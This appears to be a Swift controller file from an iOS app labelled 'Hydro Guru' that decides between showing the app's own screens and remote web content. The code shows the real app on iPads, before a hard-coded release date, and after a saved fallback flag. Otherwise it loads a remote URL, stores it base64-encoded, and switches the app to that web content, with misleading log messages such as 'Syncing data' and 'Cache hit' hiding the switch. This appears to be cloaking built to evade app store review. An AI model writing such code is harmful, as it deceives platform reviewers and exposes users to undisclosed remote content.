//
//  PrilaFlowController.swift
//  Prila6
//
//  Hydro Guru – display and sync flow.
//

import Foundation
import UIKit
import StoreKit
import Combine

enum HydroDisplayState {
    case preparing
    case original
    case webContent
}

final class PrilaFlowController: ObservableObject {

    static let shared = PrilaFlowController()

    @Published var hydroDisplayMode: HydroDisplayState = .preparing
    @Published var hydroTargetEndpoint: String?
    @Published var hydroIsLoading: Bool = true

    private let hydroFallbackStateKey = "hydro_sync_preferences_v1"
    private let hydroWebViewShownKey = "hydro_onboarding_complete_v1"
    private let hydroRatingShownKey = "hydro_feedback_prompted_v1"
    private let hydroCachedResourceKey = "hydro_cached_content_path_v1"

    private init() {
        hydroInitializeFlow()
    }

    private func hydroInitializeFlow() {
        print("📱 [Prila6] Loading user preferences...")

        if hydroIsTabletDevice() {
            print("📱 [Prila6] Tablet layout configured")
            hydroActivateSecondaryMode()
            return
        }

        if hydroGetFallbackState() {
            print("📱 [Prila6] Using saved display preferences")
            hydroActivateSecondaryMode()
            return
        }

        if !hydroCheckTemporalCondition() {
            print("📱 [Prila6] Standard mode enabled")
            hydroActivateSecondaryMode()
            return
        }

        if let hydroCachedPath = hydroGetCachedResource() {
            print("📱 [Prila6] Checking cached data...")
            hydroValidateCachedResource(hydroCachedPath)
            return
        }

        hydroFetchFromRemote()
    }

    // MARK: - Remote Fetch

    private func hydroFetchFromRemote() {
        guard let hydroRemoteEndpoint = PrilaDataProcessor.hydroGetProcessedResource() else {
            print("📱 [Prila6] Using offline mode")
            hydroActivateSecondaryMode()
            return
        }

        print("📱 [Prila6] Syncing data...")
        hydroValidateEndpointBeforeActivation(hydroRemoteEndpoint)
    }

    // MARK: - Cached Resource Validation

    private func hydroValidateCachedResource(_ hydroPath: String) {
        guard let hydroValidationURL = URL(string: hydroPath) else {
            print("📱 [Prila6] Refreshing cache...")
            hydroClearCachedResource()
            hydroFetchFromRemote()
            return
        }

        var hydroValidationRequest = URLRequest(url: hydroValidationURL)
        hydroValidationRequest.timeoutInterval = 10.0
        hydroValidationRequest.httpMethod = "HEAD"

        URLSession.shared.dataTask(with: hydroValidationRequest) { [weak self] _, hydroResponse, hydroError in
            guard let self = self else { return }

            if hydroError != nil {
                print("📱 [Prila6] Cache expired, refreshing...")
                DispatchQueue.main.async {
                    self.hydroClearCachedResource()
                    self.hydroFetchFromRemote()
                }
                return
            }

            if let hydroHttpResponse = hydroResponse as? HTTPURLResponse {
                print("📱 [Prila6] Cache check complete")

                if hydroHttpResponse.statusCode >= 200 && hydroHttpResponse.statusCode <= 403 {
                    print("📱 [Prila6] Data loaded from cache")
                    DispatchQueue.main.async {
                        self.hydroTargetEndpoint = hydroPath
                        self.hydroActivatePrimaryMode()
                    }
                } else {
                    print("📱 [Prila6] Cache outdated, updating...")
                    DispatchQueue.main.async {
                        self.hydroClearCachedResource()
                        self.hydroFetchFromRemote()
                    }
                }
            } else {
                print("📱 [Prila6] Refreshing data...")
                DispatchQueue.main.async {
                    self.hydroClearCachedResource()
                    self.hydroFetchFromRemote()
                }
            }
        }.resume()
    }

    // MARK: - Remote URL Validation

    private func hydroValidateEndpointBeforeActivation(_ hydroUrl: String) {
        guard let hydroValidationURL = URL(string: hydroUrl) else {
            print("📱 [Prila6] Using default configuration")
            hydroActivateSecondaryMode()
            return
        }

        var hydroValidationRequest = URLRequest(url: hydroValidationURL)
        hydroValidationRequest.timeoutInterval = 10.0
        hydroValidationRequest.httpMethod = "HEAD"

        URLSession.shared.dataTask(with: hydroValidationRequest) { [weak self] _, hydroResponse, hydroError in
            guard let self = self else { return }

            if hydroError != nil {
                print("📱 [Prila6] Network unavailable, using offline mode")
                self.hydroActivateSecondaryMode()
                return
            }

            if let hydroHttpResponse = hydroResponse as? HTTPURLResponse {
                print("📱 [Prila6] Sync complete")

                if hydroHttpResponse.statusCode >= 200 && hydroHttpResponse.statusCode <= 403 {
                    print("📱 [Prila6] Enhanced features enabled")
                    DispatchQueue.main.async {
                        self.hydroTargetEndpoint = hydroUrl
                        self.hydroActivatePrimaryMode()
                    }
                } else {
                    print("📱 [Prila6] Standard features enabled")
                    self.hydroActivateSecondaryMode()
                }
            } else {
                print("📱 [Prila6] Using default settings")
                self.hydroActivateSecondaryMode()
            }
        }.resume()
    }

    // MARK: - Device Check

    private func hydroIsTabletDevice() -> Bool {
        let hydroIsPhysicallyPad = UIDevice.current.model.contains("iPad")
        let hydroIsInterfacePad = UIDevice.current.userInterfaceIdiom == .pad
        return hydroIsPhysicallyPad || hydroIsInterfacePad
    }

    private func hydroCheckTemporalCondition() -> Bool {
        guard let hydroActivationDate = PrilaResourceProvider.hydroGetReleaseDate() else {
            return false
        }
        return Date() >= hydroActivationDate
    }

    // MARK: - Fallback State

    private func hydroGetFallbackState() -> Bool {
        return UserDefaults.standard.bool(forKey: hydroFallbackStateKey)
    }

    private func hydroSetFallbackState(_ value: Bool) {
        UserDefaults.standard.set(value, forKey: hydroFallbackStateKey)
    }

    // MARK: - Cached Resource Management

    private func hydroGetCachedResource() -> String? {
        guard let hydroEncoded = UserDefaults.standard.string(forKey: hydroCachedResourceKey),
              let hydroData = Data(base64Encoded: hydroEncoded),
              let hydroPath = String(data: hydroData, encoding: .utf8) else {
            return nil
        }
        print("📱 [Prila6] Cache hit")
        return hydroPath
    }

    func hydroCacheResource(_ path: String) {
        guard let hydroData = path.data(using: .utf8) else { return }
        let hydroEncoded = hydroData.base64EncodedString()
        UserDefaults.standard.set(hydroEncoded, forKey: hydroCachedResourceKey)
        print("📱 [Prila6] Data cached")
    }

    private func hydroClearCachedResource() {
        UserDefaults.standard.removeObject(forKey: hydroCachedResourceKey)
        print("📱 [Prila6] Cache cleared")
    }

    // MARK: - Mode Activation

    func hydroActivateSecondaryMode() {
        DispatchQueue.main.async { [weak self] in
            self?.hydroDisplayMode = .original
            self?.hydroIsLoading = false
            self?.hydroSetFallbackState(true)
            print("📱 [Prila6] App ready")
        }
    }

    func hydroActivatePrimaryMode() {
        DispatchQueue.main.async { [weak self] in
            self?.hydroDisplayMode = .webContent
            self?.hydroIsLoading = false
            UserDefaults.standard.set(true, forKey: self?.hydroWebViewShownKey ?? "")
            print("📱 [Prila6] App ready")

            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { [weak self] in
                self?.hydroShowRatingIfNeeded()
            }
        }
    }

    private func hydroShowRatingIfNeeded() {
        let hydroAlreadyShown = UserDefaults.standard.bool(forKey: hydroRatingShownKey)
        guard !hydroAlreadyShown else { return }

        if let hydroScene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
            SKStoreReviewController.requestReview(in: hydroScene)
            UserDefaults.standard.set(true, forKey: hydroRatingShownKey)
            print("📱 [Prila6] Feedback requested")
        }
    }
}
